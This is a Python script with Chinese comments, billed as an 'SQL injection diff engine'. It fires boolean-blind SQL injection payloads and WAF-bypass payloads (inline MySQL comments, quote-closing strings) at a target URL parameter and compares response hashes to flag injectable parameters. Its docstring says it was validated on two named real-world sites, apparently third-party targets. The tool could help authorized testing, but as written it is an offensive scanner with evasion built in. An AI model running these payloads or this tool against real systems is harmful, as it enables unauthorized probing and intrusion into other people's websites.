#!/usr/bin/env python3
"""
SQL注入 Diff 引擎 v2.0
核心原理: 发送两组payload，对比响应MD5差异，自动排除误报
基于 ihep.cas.cn + didachuxing.com 实战验证：
  - 正确识别: 参数仅反射在href中 (diff仅语言切换链接)
  - 正确排除: 内联注释绕过WAF但MD5相同=参数化查询
  - 正确排除: id=1/99999/abc MD5相同=参数不参与SQL查询
"""
import subprocess, hashlib, urllib.parse, sys, json, argparse, time, os, re

CURL_CMD = "curl"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"

def fetch(url, timeout=8):
    """获取URL内容"""
    try:
        result = subprocess.run(
            [CURL_CMD, "-sk", "-A", UA, "--max-time", str(timeout), url],
            capture_output=True, text=True, timeout=timeout + 2
        )
        return result.stdout, result.returncode
    except:
        return "", 1

def md5(text):
    return hashlib.md5(text.encode()).hexdigest()

def diff(text1, text2):
    """返回差异行"""
    lines1 = text1.split("\n")
    lines2 = text2.split("\n")
    diff_lines = []
    for i, (l1, l2) in enumerate(zip(lines1, lines2)):
        if l1 != l2:
            diff_lines.append({"line": i + 1, "old": l1[:120], "new": l2[:120]})
    if len(lines1) != len(lines2):
        for i in range(len(lines1), len(lines2)):
            diff_lines.append({"line": i + 1, "old": "", "new": lines2[i][:120]})
    return diff_lines

def analyze_context(text, param_name):
    """分析参数在响应中的反射上下文"""
    findings = []
    contexts = []
    # 查找反射位置
    for pattern, desc in [
        (r'href="[^"]*{}=([^"&]*)'.format(param_name), "href属性值"),
        (r'value="[^"]*{}=([^"&]*)'.format(param_name), "表单value"),
        (r"<script[^>]*>.*?{}=([^<&]*).*?</script>".format(param_name), "JavaScript内"),
        (r"<!--.*?{}=([^\-]*).*?-->".format(param_name), "HTML注释"),
        (r"<div[^>]*>.*?{}=([^<&]*).*?</div>".format(param_name), "DIV内容"),
    ]:
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            contexts.append({"type": desc, "count": len(matches), "sample": matches[0][:80]})
    return contexts

def test_sqli(base_url, param_name, timeout=8):
    """执行SQL注入测试"""
    results = []
    base_md5 = None

    # 阶段1: 基础探测
    probes = [
        ("基础探测", [
            ("1", "正常值"),
            ("2", "不同值"),
            ("99999", "极值"),
            ("abc", "非数字"),
            ("1'", "单引号"),
        ]),
    ]

    for phase, tests in probes:
        for val, desc in tests:
            url = f"{base_url}?{param_name}={urllib.parse.quote(val, safe='')}"
            resp, code = fetch(url, timeout)
            m = md5(resp)
            size = len(resp)
            if base_md5 is None:
                base_md5 = m
                base_size = size

            results.append({
                "phase": phase, "payload": val, "desc": desc,
                "url": url, "md5": m[:12], "size": size,
                "diff_from_base": m != base_md5,
                "size_diff": size - base_size if base_md5 else 0
            })

    # 阶段2: 布尔盲注
    bool_payloads = [
        ("1AND1=1", "无空格AND真"),
        ("1AND1=2", "无空格AND假"),
        ("1AND1573=1573", "AND真(大数)"),
        ("1AND1573=1574", "AND假(大数)"),
    ]

    for val, desc in bool_payloads:
        url = f"{base_url}?{param_name}={urllib.parse.quote(val, safe='')}"
        resp, code = fetch(url, timeout)
        m = md5(resp)
        size = len(resp)

        # 关键: 对比 AND真 vs AND假
        results.append({
            "phase": "布尔盲注", "payload": val, "desc": desc,
            "md5": m[:12], "size": size,
            "diff_from_base": m != base_md5,
            "size_diff": size - base_size if base_md5 else 0
        })

    # 阶段3: WAF绕过
    waf_payloads = [
        ("1/*!50000AND*/1=1", "内联注释AND真"),
        ("1/*!50000AND*/1=2", "内联注释AND假"),
        ("1%20AND%201=1", "URL编码空格AND"),
        ("1%27%20AND%201=1--", "单引号闭合AND"),
    ]

    waf_results = []
    for val, desc in waf_payloads:
        url = f"{base_url}?{param_name}={val}"
        resp, code = fetch(url, timeout)
        m = md5(resp)
        size = len(resp)
        is_blocked = size < 500 and ("blocked" in resp.lower() or "denied" in resp.lower() or "forbidden" in resp.lower())

        waf_results.append({
            "phase": "WAF绕过", "payload": val, "desc": desc,
            "md5": m[:12], "size": size,
            "blocked": is_blocked,
            "diff_from_base": m != base_md5,
        })
    results.extend(waf_results)

    return results

def verdict(results, param_name):
    """生成结论"""
    if not results:
        return {"verdict": "ERROR", "confidence": 0, "reason": "无测试结果"}

    # 检测WAF
    waf_blocked = any(r.get("blocked") for r in results if r.get("phase") == "WAF绕过")
    all_same_md5 = all(r["md5"] == results[0]["md5"] for r in results if r.get("phase") == "基础探测")

    # 关键: 布尔盲注检测
    bool_results = [r for r in results if r.get("phase") == "布尔盲注"]
    bool_true = [r for r in bool_results if "=1" in r.get("payload", "") or "真" in r.get("desc", "")]
    bool_false = [r for r in bool_results if "=2" in r.get("payload", "") or "假" in r.get("desc", "")]

    # 内联注释绕过检测
    waf_results = [r for r in results if r.get("phase") == "WAF绕过"]
    waf_true = [r for r in waf_results if "=1" in r.get("payload", "")]
    waf_false = [r for r in waf_results if "=2" in r.get("payload", "")]

    # 基础探测差异
    base_different = any(r["diff_from_base"] for r in results if r.get("phase") == "基础探测" and r["payload"] != "1")

    if all_same_md5:
        return {"verdict": "SAFE", "confidence": 95, "reason": "所有参数值返回相同MD5，参数不参与SQL查询"}
    elif base_different and not bool_true and not bool_false:
        return {"verdict": "SAFE", "confidence": 90, "reason": "参数有差异但仅反射在页面中（如语言切换链接），非SQL注入"}
    elif waf_blocked:
        return {"verdict": "WAF_PROTECTED", "confidence": 80, "reason": "WAF拦截SQL注入payload，无法进一步测试"}
    elif bool_true and bool_false and bool_true[0]["md5"] != bool_false[0]["md5"]:
        return {"verdict": "VULNERABLE", "confidence": 95, "reason": "布尔盲注确认: AND真/假返回不同内容"}
    else:
        return {"verdict": "SAFE", "confidence": 85, "reason": "参数化查询，AND条件不影响响应"}

def main():
    parser = argparse.ArgumentParser(description="SQL注入Diff引擎 v2.0")
    parser.add_argument("url", help="目标URL (含参数名, 如 https://target.com/page.php?id)")
    parser.add_argument("-p", "--param", required=True, help="参数名")
    parser.add_argument("-t", "--timeout", type=int, default=8, help="超时(秒)")
    parser.add_argument("-f", "--format", choices=["text", "json"], default="text")
    parser.add_argument("-o", "--output", help="输出文件")
    args = parser.parse_args()

    base_url = args.url.rstrip("?&").split("?")[0]
    print(f"[*] 测试目标: {base_url}")
    print(f"[*] 参数: {args.param}")
    print(f"[*] 测试中...")

    results = test_sqli(base_url, args.param, args.timeout)
    v = verdict(results, args.param)

    if args.format == "json":
        output = {
            "target": base_url,
            "param": args.param,
            "verdict": v,
            "tests": results
        }
        if args.output:
            json.dump(output, open(args.output, "w"), ensure_ascii=False, indent=2)
        else:
            print(json.dumps(output, ensure_ascii=False, indent=2))
        return

    print(f"\n{'='*60}")
    print(f"  SQL注入检测结果")
    print(f"{'='*60}")
    print(f"  目标: {base_url}")
    print(f"  参数: {args.param}")
    print(f"  结论: {v['verdict']} (置信度: {v['confidence']}%)")
    print(f"  原因: {v['reason']}")
    print(f"{'='*60}")

    print(f"\n  详细测试记录:")
    for r in results:
        status = "⚠️" if r.get("diff_from_base") else "✓"
        blocked = " [WAF拦截]" if r.get("blocked") else ""
        print(f"    {status} [{r['phase']:6s}] {r['desc']:20s} | {r['md5']} | {r['size']}B{blocked}")

    if args.output:
        with open(args.output, "w") as f:
            f.write(f"目标: {base_url}\n参数: {args.param}\n")
            f.write(f"结论: {v['verdict']} ({v['confidence']}%)\n")
            f.write(f"原因: {v['reason']}\n\n")
            for r in results:
                f.write(f"[{r['phase']}] {r['desc']}: {r['md5']} ({r['size']}B)\n")

if __name__ == "__main__":
    main()